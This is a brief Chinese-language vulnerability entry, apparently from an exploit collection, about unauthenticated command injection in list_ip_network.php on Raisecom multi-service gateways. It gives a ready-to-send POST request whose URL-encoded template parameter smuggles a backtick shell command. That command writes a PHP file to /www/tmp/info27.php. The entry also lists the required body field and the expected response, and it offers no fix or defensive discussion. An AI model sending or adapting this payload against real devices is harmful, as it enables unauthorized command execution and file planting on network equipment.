# 瑞斯康达多业务智能网关多个版本list_ip_network.php存在未授权命令注入

瑞斯康达多业务智能网关多个版本 ｜ 未授权访问 ｜ —
- **请求**：`POST /vpn/list_ip_network.php?template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Finfo27.php%60 HTTP/1.1`

**Payload**
```
Nradius_submit=true
```
- **响应特征**：200